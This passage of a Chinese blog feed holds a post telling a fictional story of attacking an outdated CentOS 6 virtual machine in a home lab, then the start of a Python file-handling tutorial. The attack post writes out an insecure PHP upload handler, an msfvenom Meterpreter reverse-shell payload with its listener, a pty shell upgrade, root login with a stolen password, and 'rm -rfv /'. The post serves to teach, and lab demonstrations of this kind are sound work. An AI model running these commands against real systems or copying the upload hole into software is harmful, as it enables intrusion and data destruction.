<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064" target="_blank" rel="noopener noreffer">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></li>
<li><a href="https://www.exploit-db.com/exploits/35229" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/35308" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></li>
<li><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows" target="_blank" rel="noopener noreffer">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></li>
<li><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module" target="_blank" rel="noopener noreffer">CVE-2014-6332: it’s raining shells | forsec</a></li>
<li><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2" target="_blank" rel="noopener noreffer">kali bettercap的使用 | UsstZt</a></li>
<li><a href="https://blog.csdn.net/qq_33066259/article/details/80737308" target="_blank" rel="noopener noreffer">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></li>
<li><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead." target="_blank" rel="noopener noreffer">DeepL Translate</a></li>
</ul>
]]></description>
</item><item>
    <title>攻击 CentOS6 虚拟机</title>
    <link>http://weepingdogel.github.io/posts/2020-09-26/</link>
    <pubDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/2020-09-26/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg" referrerpolicy="no-referrer">
            </div><blockquote>
<p>虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。</p>
</blockquote>
<h2 id="序">序</h2>
<p>最近总听到一些声音。</p>
<p>一些关于软件更新的、不同的声音。</p>
<p>一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写</p>
<p>另一边说：持续不断的更新才能带来更好的体验</p>
<p>我不知道哪一边是对的，但有点好奇</p>
<p>我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。</p>
<p>只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。</p>
<h2 id="模拟环境">模拟环境</h2>
<blockquote>
<p>攻击者平台: Arch Linux</p>
<p>IP: 192.168.0.109</p>
<p>受害平台: CentOS 6.1 on VirtualBox</p>
<p>IP: 192.168.0.116</p>
</blockquote>
<p><strong>假如</strong>这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）</p>
<p>我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。</p>
<p>由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。</p>
<p>外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;错误：&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;上传文件名: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件类型: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件大小: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件临时存储的位置: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件存储在: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>由于条件有限，只能模拟到这个程度，但我个人认为<del>足以进行抽象测试了</del>(逃</p>
</blockquote>
<h2 id="攻击过程">攻击过程</h2>
<p>总有人喜欢搞破坏，一名黑客对服务器进行了扫描&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O -v 192.168.0.116
</span></span></code></pre></td></tr></table>
</div>
</div><p>结果是这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.116
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 998 closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X|3.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.32 - 3.10
</span></span><span class="line"><span class="cl">Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=261 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
</span></span></code></pre></td></tr></table>
</div>
</div><p>他惊讶地发现内核版本居然才 <code>2.6.32</code>，这样的事他还是第一次见。</p>
<p>除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。</p>
<p>他试图访问了网站，在网站上发现了一个文件上传点。</p>
<p></p>
<p>抱着试试看的态度，用 msf 生成了一个 payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
</p>
<p>于是他启动了 <code>msfconsole</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>并使用  <code>exploit/multi/handler</code> 这个模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler 
</span></span></code></pre></td></tr></table>
</div>
</div><p>依次设置好参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.109
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LPORT 4444
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后一步就是运行模块了，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后 msf 开始监听。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span></code></pre></td></tr></table>
</div>
</div><p>这时他将提示出的文件地址和链接改一下，并访问</p>
<blockquote>
<p><code>http://192.168.0.116/upload/shell.php</code></p>
</blockquote>
<p>msf 立刻就有了结果，可想而知，服务器的安全措施有多差</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span><span class="line"><span class="cl">[*] Sending stage (38288 bytes) to 192.168.0.116
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.109:4444 -&gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在他开始获取系统简要信息</p>
<ul>
<li>系统、内核版本</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer    : localhost
</span></span><span class="line"><span class="cl">OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
</span></span><span class="line"><span class="cl">Meterpreter : php/linux
</span></span><span class="line"><span class="cl">meterpreter &gt; cat /etc/issue
</span></span><span class="line"><span class="cl">CentOS release 6.10 (Final)
</span></span><span class="line"><span class="cl">Kernel \r on an \m
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>当前控制的用户权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span><span class="line"><span class="cl">Server username: apache (48)
</span></span></code></pre></td></tr></table>
</div>
</div><p>权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。</p>
<p>由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。</p>
<p>看起来他需要想想其他办法。</p>
<p>他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。</p>
<p>一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。</p>
<p>上面写着一些数字和字母，也许是什么有用的东西。</p>
<p>趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。</p>
<p>比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。</p>
<p>下班后回到终端，尝试着用偷窥来的密码直接登陆 root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span><span class="line"><span class="cl">Process 1376 created.
</span></span><span class="line"><span class="cl">Channel 2 created.
</span></span></code></pre></td></tr></table>
</div>
</div><p>获得交互 shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/bin/sh -i
</span></span><span class="line"><span class="cl">sh: no job control in this shell
</span></span><span class="line"><span class="cl">sh-4.1$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>进行登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">bash-4.1$ su root
</span></span><span class="line"><span class="cl">su root
</span></span><span class="line"><span class="cl">Password: ************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，一口气便登录成功，root 权限到了他的手里。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">[root@localhost upload]# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来他便可以为所欲为了..</p>
<p>对，他最后进行了删库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# rm -rfv /
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后导致公司损失巨大..</p>
<h2 id="结语">结语</h2>
<p>虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。</p>
<p>但却值得我们思考，就我们能看到的来看&hellip;</p>
<ul>
<li>系统不更新容易被攻击</li>
<li>代码不更新容易出漏洞</li>
<li>密码更新太慢容易泄露</li>
<li>漏洞以更新来修复，不修则被利用</li>
</ul>
<p>而我们看不到的&hellip;</p>
<p>软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？</p>
<p>不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。</p>
<p>而不能站立不动甚至往回走。</p>
<p>物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。</p>
<p>甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..</p>
<p>以上，只是个人想法，若有不当之处，请在下面的评论插件中 <del>喷我</del> 纠正。</p>
]]></description>
</item><item>
    <title>Python 学习笔记——文件操作</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</link>
    <pubDate>Sat, 05 Sep 2020 22:12:05 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/wy/wallhaven-wyzxvr.jpg" referrerpolicy="no-referrer">
            </div><h2 id="文件操作">文件操作</h2>
<h3 id="open">open</h3>
<p><code>open()</code> 是 Python 进行文件操作的关键函数，它有连个参数需要设置</p>
<ul>
<li>文件名 - 文件的名称，不多解释</li>
<li>模式 - 决定打开的文件是否可读写以及其他属性</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span><span class="s1">&#39;mode&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="读">读</h3>
<p>仅以只读方式打开一个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;filename.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样写也是一样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;filename&#34;</span><span class="p">,</span><span class="s2">&#34;rt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>&ldquo;r&rdquo;</strong> 表示读</p>
<p><strong>&ldquo;t&rdquo;</strong> 表示文本，这是函数默认设定好的，所以可以省略。</p>
<p>这里引入一下 <a href="https://www.w3schools.com/python/python_file_handling.asp" target="_blank" rel="noopener noreffer">w3school</a> 的一个列表</p>
<blockquote>
<p>There are four different methods (modes) for opening a file:</p>
<blockquote>
<p>&ldquo;r&rdquo; - Read - Default value. Opens a file for reading, error if the file does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;a&rdquo; - Append - Opens a file for appending, creates the file if it does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;w&rdquo; - Write - Opens a file for writing, creates the file if it does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;x&rdquo; - Create - Creates the specified file, returns an error if the file exists</p>
</blockquote>
<p>In addition you can specify if the file should be handled as binary or text mode</p>
<blockquote>
<p>&ldquo;t&rdquo; - Text - Default value. Text mode</p>
</blockquote>
<blockquote>
<p>&ldquo;b&rdquo; - Binary - Binary mode (e.g. images)</p>
</blockquote>
</blockquote>
<p>以一个文件举例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/home/weepingdogel/test.txt
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们不写 mode 参数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们将它加上：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>结果是一模一样的。</p>
<h4 id="读行">读行</h4>
<p>文件:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/home/weepingdogel/test.txt
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>当我们遇到一个多行文件的时候，我们可以选择只读取它其中一行
<code>f.readline()</code></p>
<p>例如:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行后：</p>
